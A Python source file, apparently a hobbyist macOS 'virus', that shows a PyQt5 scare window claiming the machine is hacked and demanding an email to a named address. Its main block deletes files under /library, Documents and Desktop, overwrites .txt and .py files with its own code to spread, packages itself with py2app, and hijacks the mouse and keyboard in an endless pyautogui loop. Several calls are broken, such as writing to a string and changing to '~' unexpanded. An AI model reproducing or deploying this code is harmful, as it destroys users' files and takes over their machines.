import os
import shutil
import pyautogui
from PyQt5.QtWidgets import *

virus = ''

style = '''
QWidget {
    background-color: coral; 
} 
QPushButton {
    background-color: #006325;
    font-size: 20px;
    color: white;

    min-width:  100px;
    max-width:  100px;
    min-height: 100px;
    max-height: 100px;

    border-radius: 5px;        
    border-width: 1px;
    border-color: #ae32a0;
    border-style: solid;
}
QPushButton:hover {
    background-color: #328930;
    color: yellow;
}
QPushButton:pressed {
    background-color: #80c342;
    color: red;
}
[accessibleName="namel"] {
    color: white;
}
QLabel{
    font-family: 'ubuntu';
    font-size: 20px;
}
'''

class Widgets(QWidget):
    def __init__(self, **kwargs):
        super(Widgets, self).__init__()
        
        self.vlayout = QVBoxLayout(self)
        
        # Horizontal Layout 1****************************
        self.hlayout_1 = QHBoxLayout(self)
        
        self.alert = QLabel()
        self.alert.setWordWrap(True)
        self.alert.setText("Hello from 𝕁𝕒𝕤𝕠𝕟!No, no, do not think of closing this window. Why? Cuz your computer has been h̷a̷c̷k̷e̷d̷! You don't beleive me? Well, try to move your mouse... You can't right? Now, you may think that you should restart your computer. Right? Well, well, if you do that, all the data will be cleared from the computer and your computer will be nothing. Also, by data, I don't mean all ყσᥙɾ data, but it includes everything, including your acount, defualt applications(no, ʅʅɐ applications) and ... your system folders blah blah. What you should do is simple, just send a mail to jason3leo@gmail.com which says - hello. So simple! No really I mean it, if you do that, you will be free!")
        self.hlayout_1.addWidget(self.alert)
        
        # Add layouts***********************************
        self.vlayout.addLayout(self.hlayout_1)
        self.setLayout(self.vlayout)

def window(): 
    app = QApplication([])

    wig = Widgets()
    wig.setStyleSheet(style)
    wig.show()

    app.exec_()
 
def replecate(full_virus, file):
    open(file, "w").close()
    with open(file, "r+") as f:
        file.write(full_virus)
    
if __name__ == "__main__":
    full_virus = open("to_copy.py", "r").read()
    full_virus.close()
    
    os.chdir("/")
    os.chdir("library")
    print(os.listdir())
    os.system("sudo rmdir hello")
    # shutil.rmtree("hello")
    
    for file in os.listdir():
        print(os.listdir())
        try:
            os.remove(file)
            print("removed")
        except:
            try:
                shutil.rmtree(file)
                print("shutiled")
            except:
                pass
            
    os.chdir("~")
    os.chdir("Documents")
    
    for file in os.listdir():
        if file.endswith(".txt") or file.endswith(".py"):
            replecate(full_virus, file)
        else:
            try:
                os.remove(file)
            except:
                try:
                    shutil.rmtree(file)
                except:
                    pass
                
    with open("new7.py", "w") as f:
        f.write('''Hello
                
                ''')
    os.system('pip install py2app')
    os.system('py2applet --make-setup new7.py')
    os.system('python3 setup.py py2app -A')
            
    os.chdir("~")
    os.chdir("Desktop")
    
    for file in os.listdir():
        if file.endswith(".txt") or file.endswith(".py"):
            replecate(full_virus, file)
        else:
            try:
                os.remove(file)
            except:
                try:
                    shutil.rmtree(file)
                except:
                    pass
    
    with open("new7.py", "w") as f:
        f.write(full_virus)
    os.system('pip install py2app')
    os.system('py2applet --make-setup new7.py')
    os.system('python3 setup.py py2app -A')
    
    while True:
        try:
            pyautogui.press("tab")
            pyautogui._mouseMoveDrag("move", 1, 1, 600, 600, 60)
            pyautogui.press("enter")
        except:
            continue
